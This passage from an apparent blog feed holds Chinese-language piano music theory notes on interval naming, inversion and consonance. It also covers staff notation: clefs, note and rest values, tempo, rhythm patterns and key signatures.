class="headerlink" title="含升降号的情况"></a>含升降号的情况</h4><p>先去掉升降号，判断出音程后，根据升降号确定音数是变大了还是变小了，进而得到最后的音程。<br>如要判断E4♭♭到C5♯的音程，首先知道E4到C5是六度，其间包含两个EF或BC，因此是小六度。<br>E4到C5♯相较于E4到C5音数要大0.5，因此E4到C5♯是大六度。<br>E4♭♭到C5♯相较于E4到C5♯音数要大1，因此E4♭♭到C5♯是倍增六度。</p><h3 id="超过八度的音程"><a href="#超过八度的音程" class="headerlink" title="超过八度的音程"></a>超过八度的音程</h3><p>先确定两个音的度数，再将两个音放在八度以内，判断八度以内的音程，来确定音程度数前面的前缀。<br>如C4到E5是十度，将其放到同一个八度，即C4到E4，C-E是三度，且不包含EF或BC，是大三度。保留大三度的前缀“大”，因此C4到E5是大十度。<br>再如D3到G6♯是二十五度，将其放到同一个八度，即D3到G3♯，D-G是四度，且包含一个EF，因此是纯四度，D3到G3♯相较于D3到G3多0.5个音数，因此是增四度，保留增四度的前缀“增”，因此D3到G6♯是增二十五度。</p><h4 id="单音程与复音程"><a href="#单音程与复音程" class="headerlink" title="单音程与复音程"></a>单音程与复音程</h4><p>有两种定义。定义一认为度数小于等于8为单音程，度数大于八为复音程；定义二认为实际距离小于等于纯八度的距离（音数小于等于6）为单音程，反之为复音程。<br>倍增七度、增八度、倍增八度在定义一中为单音程，定义二中为复音程；<br>减九度、倍减九度在定义一中为复音程，定义二中为单音程。</p><h3 id="音程名字的简写"><a href="#音程名字的简写" class="headerlink" title="音程名字的简写"></a>音程名字的简写</h3><p>主要的音程前缀有——大(Major)、小(minor,m为小写)、增(Augmented)、减(Diminished)、纯(Perfect或Pure)。（倍增与倍减不常见）<br>简写时就采用前缀首字母+数字的形式，如大三度记为M3，小七度记为m7，增五度记为A5。<br>亦可用Major与minor形容调式，如C大调记为C Major，D小调记为D minor。</p><h3 id="旋律音程与和声音程"><a href="#旋律音程与和声音程" class="headerlink" title="旋律音程与和声音程"></a>旋律音程与和声音程</h3><p>两个音先后弹奏时，称为旋律音程。<br>两个音同时弹奏时，称为和声音程。</p><h3 id="自然音程与变化音程"><a href="#自然音程与变化音程" class="headerlink" title="自然音程与变化音程"></a>自然音程与变化音程</h3><p>在“自然大小调音阶”里直接存在的音程称为自然音程。可以由两个白键形成的音程称为自然音程。所有在表4中出现的音程都是自然音程。<br>在“自然大小调音阶”里不存在的音程称为变化音程，要通过临时升降音产生变化而形成。自然音程之外的音程称为变化音程。<br>如C4♯到F4♯是纯四度，纯四度在表4中能找到，因此C4♯与F4♯形成的是自然音程。<br>再如C4到A4♯是增六度，增六度在表4中找不到，说明增六度不是能由两个白键形成的音程，因此C4到A4♯形成的是变化音程。<br>超过八度的音程，将两个音放在八度以内，判断八度以内的音程能否在表4中找到，从而判断其是自然音程还是变化音程。</p><h3 id="协和音程与不协和音程"><a href="#协和音程与不协和音程" class="headerlink" title="协和音程与不协和音程"></a>协和音程与不协和音程</h3><p>协和音程分为三种：<br>①极完全协和音程——纯一度、纯八度…纯(1+7n)度（n为整数且n≥0）<br>②完全协和音程——纯四度、纯五度…纯(4或5+7n)度（n为整数且n≥0）<br>③不完全协和音程——大三度、小三度、大六度、小六度…大或小(3或6+7n)度（n为整数且n≥0）<br>协和音程之外的音程称为不协和音程：<br>大二度、小二度、大七度、小七度…大或小(2或7+7n)度（n为整数且n≥0）<br>所有增音程、减音程、倍增音程、倍减音程。</p><p>C4到A4♭是小六度，是不完全协和音程，而C4到G4♯是增五度，是不协和音程。虽然A4♭与G4♯是等音，小六度与增五度是等音程，C4到A4♭与C4到G4♯在弹奏时的音高完全相同，但它们所处的音乐语境不同，即在一段连续的音乐中，通过与其他声音，其他和弦，其他音程的对比，所体现出的协和程度是不一样的。</p><h3 id="音程转位"><a href="#音程转位" class="headerlink" title="音程转位"></a>音程转位</h3><p>转位指改变两个音的高低顺序。如C4到E4，可以转位得到E4到C5、E3到C4、E4到C6、E5到C6等等（只要是E-C就行）。而通常情况下转位得到的是E4到C5、E3到C4（原位中的一个音不动，转位后在八度以内）。<br>可以根据原位的音程名字，推出转位后的音程名字。音程名字前缀对应关系为：大↔︎小、纯↔︎纯、增↔︎减、倍增↔︎倍减。原位的音数大于0且小于6时，原位与转位的音程度数之和为9。如C4-D4是大二度，其转位D4-C5是小七度。<br>原位的音数等于0或大于6时，不满足“原位与转位的音程度数之和为9”这一规律。如纯一度的转位仍为纯一度，纯八度的转位仍为纯八度。增七度的转位为减九度（如D4♭到C5♯为增七度，其转位C3♯到D4♭为减九度。其转位不是C4♯到D4♭，是因为C4♯与D4♭等音，而转位要求两个音的高低顺序彻底改变）。<br>原位音程与转位音程的各类性质（自然音程还是变化音程，协和音程还是不协和音程）不会改变。<br>如C4到F4𝄪是倍增四度，其转位F4𝄪到C5是倍减五度。倍增四度与倍减五度都是变化音程，不协和音程。<br>度数大于八的音程，先缩小到八度以内，再转位。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钢琴</tag>
      
      <tag>乐理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>乐理笔记05-五线谱</title>
    <link href="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/"/>
    <url>/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/</url>
    
    <content type="html"><![CDATA[<h2 id="五线谱"><a href="#五线谱" class="headerlink" title="五线谱"></a>五线谱</h2><h3 id="谱号"><a href="#谱号" class="headerlink" title="谱号"></a>谱号</h3><p>五线谱有五条线，由下至上分别可称为一线、二线、三线、四线、五线。五条线形成四个空间由下至上可称为一间、二间、三间、四间。此外五线谱可以加线，向上加线可称为上加一线、上加二线、上加三线等，形成上加一间、上加二间、上加三间等；向下加线可称为下加一线、下加二线、下加三线等，形成下加一间、下加二间、下加三间等。</p><h4 id="高音谱号"><a href="#高音谱号" class="headerlink" title="高音谱号"></a>高音谱号</h4><p>高音谱号符号为𝄞，由字母G的花体演化而来。该谱号记在五线谱的第二线上（手写时从第二线开始画），表示五线谱的第二线对应音名g1g1（或G4），对应其他音名如下图所示。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/1_%E9%AB%98%E9%9F%B3%E8%B0%B1%E5%8F%B7.png" alt="img">上图中音名全部对应钢琴中的白键，可以在音符前加升降号来对应钢琴中的黑键。</p><h4 id="低音谱号"><a href="#低音谱号" class="headerlink" title="低音谱号"></a>低音谱号</h4><p>低音谱号符号为𝄢，由字母F的花体演化而来。该谱号记在五线谱的第四线上（手写时从第四线开始画），表示五线谱的第四线对应音名ff（或F3），对应其他音名如下图所示。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/2_%E4%BD%8E%E9%9F%B3%E8%B0%B1%E5%8F%B7.png" alt="img"></p><h4 id="中音谱号与次中音谱号"><a href="#中音谱号与次中音谱号" class="headerlink" title="中音谱号与次中音谱号"></a>中音谱号与次中音谱号</h4><p>中音谱号与次中音谱号的符号为𝄡，由字母C的花体演化而来。中音谱号记在五线谱的第三线上，表示五线谱的第三线对应音名c1c1（或C4）;次中音谱号记在五线谱的第四线上，表示五线谱的第四线对应音名c1c1（或C4）。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/3_%E4%B8%AD%E9%9F%B3%E8%B0%B1%E5%8F%B7.png" alt="img"></p><h3 id="八度记号与十五度记号"><a href="#八度记号与十五度记号" class="headerlink" title="八度记号与十五度记号"></a>八度记号与十五度记号</h3><p>八度记号用于表示某个区间的音符需要提高一个八度（𝄶，记在上方）或降低一个八度（𝄷，记在下方）演奏。<br>十五度记号用于表示某个区间的音符需要提高两个八度（𝄸，记在上方）或降低两个八度（𝄹，记在下方）演奏。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/4_%E5%85%AB%E5%BA%A6%E8%AE%B0%E5%8F%B7.png" alt="img">当然也有二十二度记号，即提高或降低三个八度。</p><h3 id="拍号"><a href="#拍号" class="headerlink" title="拍号"></a>拍号</h3><p>和简谱类似，不再赘述。<br>补充：44拍亦可记为“𝄴”，22拍亦可记为“𝄵”。</p><h3 id="音符"><a href="#音符" class="headerlink" title="音符"></a>音符</h3><p>表1 音符及其时长(以44拍为例)</p><table><thead><tr><th align="center">名称</th><th align="center">简谱记法</th><th align="center">五线谱记法</th><th align="center">时长</th></tr></thead><tbody><tr><td align="center">倍全音符</td><td align="center">1−−−−−−−1−−−−−−−</td><td align="center">𝅜</td><td align="center">八拍（两节）</td></tr><tr><td align="center">全音符</td><td align="center">1−−−1−−−</td><td align="center">𝅝</td><td align="center">四拍（一节）</td></tr><tr><td align="center">二分音符</td><td align="center">1−1−</td><td align="center">𝅗𝅥</td><td align="center">二拍</td></tr><tr><td align="center">四分音符</td><td align="center">11</td><td align="center">𝅘𝅥</td><td align="center">一拍</td></tr><tr><td align="center">八分音符</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E5%85%AB%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></td><td align="center">𝅘𝅥𝅮</td><td align="center">半拍</td></tr><tr><td align="center">十六分音符</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E5%8D%81%E5%85%AD%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></td><td align="center">𝅘𝅥𝅯</td><td align="center">四分之一拍</td></tr><tr><td align="center">三十二分音符</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E4%B8%89%E5%8D%81%E4%BA%8C%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></td><td align="center">𝅘𝅥𝅰</td><td align="center">八分之一拍</td></tr><tr><td align="center">六十四分音符</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E5%85%AD%E5%8D%81%E5%9B%9B%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></td><td align="center">𝅘𝅥𝅱</td><td align="center">十六分之一拍</td></tr></tbody></table><p>音符中的实心或空心圈称为“符头”，符头的位置决定了音高。<br>竖线可称为“符干”，除全音符、倍全音符外的音符都有符干。<br>八分音符及时值更短的音符有“符尾”，音符符尾的条数与其简谱音符下横线数相等。<br>五线谱的附点记在音符的符头右侧，表示的意义与简谱相同，即延长原音符时长一半。<br>两个附点表示在第一个附点延长一半的基础上，第二个附点再延长原音符时长一半的一半（1.75倍）。三个附点的时长为原音符的1.875倍，以此类推。</p><p>表2 休止符及其时长</p><table><thead><tr><th align="center">名称</th><th align="center">简谱记法</th><th align="center">五线谱记法</th></tr></thead><tbody><tr><td align="center">全休止符</td><td align="center">00000000</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E5%85%A8%E4%BC%91%E6%AD%A2%E7%AC%A6.png" alt="img"></td></tr><tr><td align="center">二分休止符</td><td align="center">0000</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E4%BA%8C%E5%88%86%E4%BC%91%E6%AD%A2%E7%AC%A6.png" alt="img"></td></tr><tr><td align="center">四分休止符</td><td align="center">00</td><td align="center">𝄽</td></tr><tr><td align="center">八分休止符</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E5%85%AB%E5%88%86%E4%BC%91%E6%AD%A2%E7%AC%A6.gif" alt="img"></td><td align="center">𝄾</td></tr><tr><td align="center">十六分休止符</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E5%8D%81%E5%85%AD%E5%88%86%E4%BC%91%E6%AD%A2%E7%AC%A6.gif" alt="img"></td><td align="center">𝄿</td></tr><tr><td align="center">三十二分休止符</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/%E4%B8%89%E5%8D%81%E4%BA%8C%E5%88%86%E4%BC%91%E6%AD%A2%E7%AC%A6.gif" alt="img"></td><td align="center">𝅀</td></tr></tbody></table><p>全休止符贴第四线，二分休止符贴第三线。<br>八分休止符及时值更短的休止符符尾的条数与其简谱下横线数相等。<br>全休止符即可表示休止四拍，也可表示休止一整个小节（此时整个小节只记一个全休止符）。<br>休止符加附点同样是延长时值，规则与音符附点相同。<br>连线、延音线规则与简谱相同。</p><h3 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h3><p>抽象的速度记法与简谱相同。<br>具体的速度，可以记为“𝅘𝅥&#x3D;120”的形式，意为每分钟奏120个四分音符时对应的速度，若乐谱以四分音符为一拍（拍号分母为4），即可进一步解释为“每分钟120拍”。<br>同理，“𝅗𝅥&#x3D;60”意为每分钟奏60个二分音符时对应的速度，若乐谱以二分音符为一拍（拍号分母为2），即可进一步解释为“每分钟60拍”。<br>对于拍号分子为3或6的乐谱，如83拍、86拍。会以3拍为一组计算速度，如对于83拍乐谱，“𝅘𝅥.&#x3D;60”意为每分钟奏60个附点四分音符（三拍时长）时对应的速度，相当于每分钟180拍，即“𝅘𝅥𝅮&#x3D;180”。</p><h3 id="节奏型"><a href="#节奏型" class="headerlink" title="节奏型"></a>节奏型</h3><p>常见的节奏型与简谱一致。</p><p>表3 常见节奏型</p><table><thead><tr><th align="center">名称</th><th align="center">简谱记法&#x2F;打拍子方法</th><th align="center">五线谱记法</th></tr></thead><tbody><tr><td align="center">二八</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%85%AB%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%85%AB%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%85%AB%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%85%AB%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">四十六</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%8D%81%E5%85%AD%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%8D%81%E5%85%AD%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%8D%81%E5%85%AD%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%8D%81%E5%85%AD%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">前八后十六</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%89%8D%E5%85%AB%E5%90%8E%E5%8D%81%E5%85%AD%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%89%8D%E5%85%AB%E5%90%8E%E5%8D%81%E5%85%AD%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%89%8D%E5%85%AB%E5%90%8E%E5%8D%81%E5%85%AD%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%89%8D%E5%85%AB%E5%90%8E%E5%8D%81%E5%85%AD%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">前十六后八</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%89%8D%E5%8D%81%E5%85%AD%E5%90%8E%E5%85%AB%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%89%8D%E5%8D%81%E5%85%AD%E5%90%8E%E5%85%AB%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%89%8D%E5%8D%81%E5%85%AD%E5%90%8E%E5%85%AB%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%89%8D%E5%8D%81%E5%85%AD%E5%90%8E%E5%85%AB%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">前附点</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%89%8D%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%89%8D%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%89%8D%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%89%8D%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">后附点</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%90%8E%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%90%8E%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%90%8E%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%90%8E%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">大附点</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">小切分</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%B0%8F%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%B0%8F%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%B0%8F%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%B0%8F%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">大切分</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></td></tr><tr><td align="center">三连音</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E4%B8%89%E8%BF%9E%E9%9F%B3.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/5_%E4%B8%89%E8%BF%9E%E9%9F%B3.png" alt="img"></a></td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E4%B8%89%E8%BF%9E%E9%9F%B3.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/6_%E4%B8%89%E8%BF%9E%E9%9F%B3.png" alt="img"></a></td></tr></tbody></table><h3 id="调号"><a href="#调号" class="headerlink" title="调号"></a>调号</h3><p>五线谱的调号用升降号在谱号后表示，使用哪些升降号取决于调式音阶中哪些音带升降号。<br>如D大调的调号可表示为<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/D%E5%A4%A7%E8%B0%83.png" alt="img">，可以观察到其高音谱号第三间(#C5)、第五线(#F5)与低音谱号第二间(#C4)、第四线(#F4)上有升号，有升号的位置对应着音名C与F。而D大调音阶为D、E、#F、G、A、B、#C、D，其中音名C与F上有升号。<br>五线谱的调号可以理解为适用于整个乐谱的“变音记号”，用于提示相应的音名需要升音或降音演奏。如D大调的调号表示乐谱中（更换调号前）所有的C或F都要演奏为#C或#F（所有组的C与F，不局限于C4、F4、C5、F5)，这样在乐谱中的C与F音符不用再加“#”号来提示。</p><p><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/7_%E4%BA%94%E7%BA%BF%E8%B0%B1%E7%9A%84%E8%B0%83%E5%8F%B7.png" alt="img">五线谱一共有十五种调号，如上图所示。其中C大调不含任何升降号，其余调号含有1到7个升号或降号。<br>观察升号最多的大调，升C大调有7个升号，从左到右依次是<strong>“#F、#C、#G、#D、#A、#E、#B”</strong>。去掉最后一个升号“#B”，得到“#F、#C、#G、#D、#A、#E”，正好是有6个升号的升F大调，再去掉“#E”，则可得到有5个升号的B大调。以此类推，只留下第一个“#F”，这就是有1个升号的G大调。<br>降号最多的大调为降C大调，从左到右依次是<strong>“♭B、♭E、♭A、♭D、♭G、♭C、♭F”</strong>，也可按照这个规则推出其他带降号的大调。<br>口诀：FCGDAEB，BEADGCF；4152637，7362514。</p><p>五线谱的调号可以通过一定规则去识别：<br><strong>带有升号的大调，最后一个升号是#X音时，此调为(#X+半音)大调。</strong><br>如4个升号的大调，其最后一个升号是#D，#D提高半音是E，故该调为E大调。<br><strong>带有降号的大调，倒数第二个降号是♭X音时，此调为♭X大调</strong><br>如5个降号的大调，其倒数第二个降号时♭D，故该调为♭D大调。</p><h3 id="记号"><a href="#记号" class="headerlink" title="记号"></a>记号</h3><p>五线谱的记号大多数与简谱记号一致。<br>力度记号、速度记号、反复记号——与简谱完全一致；<br>省略记号——将单音震音记号画在音符符干位置，双音震音记号画在音符中央，其余省略记号与简谱完全一致；<br>演奏记号——顿音记号在五线谱中被分为“跳音”与“顿音”两种，其中跳音符号为“·”，标在音符上方或下方，表示演奏原音符二分之一时值，顿音符号为“▼”，标在音符上方或下方，表示演奏原音符四分之一时值。几个连续的跳音记号上画连线时，如“”。意为“连续的跳音”，理论上演奏时长为原音符的四分之三时长。<br>倚音记号在五线谱中的记法如图<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B005-%E4%BA%94%E7%BA%BF%E8%B0%B1/8_%E5%80%9A%E9%9F%B3.png" alt="img">，原音与倚音用连线相连，倚音上画有一根短斜线。<br>其余演奏记号只是记法稍有区别，在意义上与简谱完全一致。<br>临时变音记号规则与简谱一致。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钢琴</tag>
      
      <tag>乐理</tag>
      
    </tags>
    
  </entry>
  
